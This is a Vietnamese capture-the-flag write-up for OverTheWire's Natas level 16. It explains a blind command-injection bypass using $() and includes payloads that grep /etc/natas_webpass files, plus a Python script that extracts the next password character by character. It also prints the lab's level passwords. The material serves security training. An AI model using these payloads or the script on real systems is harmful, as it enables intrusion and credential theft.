## 🕵️‍♂️ Challenge:
Username: natas16   
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo  
URL: http://natas16.natas.labs.overthewire.org  

<img width="888" src="https://github.com/user-attachments/assets/d46b4563-2f2d-4170-ba77-529291a00f7c" />

<img width="1325" src="https://github.com/user-attachments/assets/b697659d-6983-4b78-afb7-06cd26d01dea" />

## 📝 Solution: 

Source code có kiểm tra đầu vào, lọc các kí tự có thể thực thi Command Injection  
Nhưng lọc thiếu `$()`, đối với chuỗi `"$(Command...)"` thì đoạn lệnh `$()` bên trong vẫn luôn được thực thi trước.  

<img width="770" height="494" alt="image" src="https://github.com/user-attachments/assets/de50edbd-f51e-481f-bf39-e5b0e9806299" />

Như ảnh, mình thử chạy lệnh echo needle thì output của lệnh echo sẽ là "needle", sau đó lệnh grep sẽ lọc ra "needle" bên trong file dictionary.txt  
Vậy mình thử:
```bash
$(grep 1 /etc/natas_webpass/natas16) 
$(grep 2 /etc/natas_webpass/natas16) 
$(grep 3 /etc/natas_webpass/natas16) 
```
thì 2 lệnh injecton đầu trả về file dictionary.txt gốc, còn đến lệnh thứ 3 thì trả về rỗng.  
Vì thứ tự xảy ra khi chạy lệnh 3:

Shell chạy $(grep 3 /etc/natas_webpass/natas16) trước.  
Nếu trong password có ký tự 3, lệnh grep 3 ... sẽ in ra cả dòng password.  
Khi đó lệnh ngoài thành kiểu:  

> grep -i "matkhauthat" dictionary.txt  

Vì dictionary.txt gần như chắc không chứa nguyên password, nên kết quả rỗng.   

Còn lệnh 1 và 2 thì ko grep thấy kí tự 1 và 2 trong pass nên grep trả về rỗng, sau đó lệnh grep ngoài sẽ tìm "" trong dictionary.txt nên sẽ trả về toàn bộ nội dung file.  

Từ đó, mình nghĩ theo hướng:  
Payload:  
```bash
$(grep ^a /etc/natas_webpass/natas16)
```

Ý nghĩa:

nếu password bắt đầu bằng a -> Bên trong grep ^a ... match -> Bên ngoài grep rỗng

nếu không bắt đầu bằng a -> Bên trong trả rỗng -> Bên ngoài in dictionary

Sau khi biết ký tự đầu là gì, dò tiếp:

```bash
$(grep ^ab /etc/natas_webpass/natas16)
$(grep ^abc /etc/natas_webpass/natas16)
```

Cứ thế cho tới hết 32 ký tự: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  

Script:  

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://51.21.210.216/"
HOST = "natas16.natas.labs.overthewire.org"

USER = "natas16"
PASSWORD = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
TARGET = "/etc/natas_webpass/natas17"

CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MARKER = "needle"

session = requests.Session()

def fetch(payload: str) -> str:
    r = session.get(
        URL,
        params={"needle": payload},
        headers={"Host": HOST},
        auth=HTTPBasicAuth(USER, PASSWORD),
        timeout=10,
    )
    return r.text

# baseline sai để tối ưu thời gian, tránh grep ra nguyên file dictionary.txt rất lâu
baseline_text = fetch(f"$(grep ^ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ {TARGET}){MARKER}")
baseline_len = len(baseline_text)

print("[*] baseline_len =", baseline_len)

found = ""

for _ in range(32):
    hit = False

    for ch in CHARS:
        prefix = found + ch
        payload = f"$(grep ^{prefix} {TARGET}){MARKER}"
        text = fetch(payload)
        cur_len = len(text)

        print(f"Trying: {prefix:<32} len={cur_len}", end="\r")

        # đúng prefix -> output rỗng -> ngắn hơn baseline
        if cur_len < baseline_len:
            found += ch
            print(f"[+] {found}")
            hit = True
            break

    if not hit:
        print(f"\n[!] Kẹt ở prefix: {found}")
        break

print("[*] Result:", found)
```

<img width="399" src="https://github.com/user-attachments/assets/bfc62eee-390d-47a8-a067-4c168862086a" />


Done!!!  

>### 🎯 Password: ***EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC***
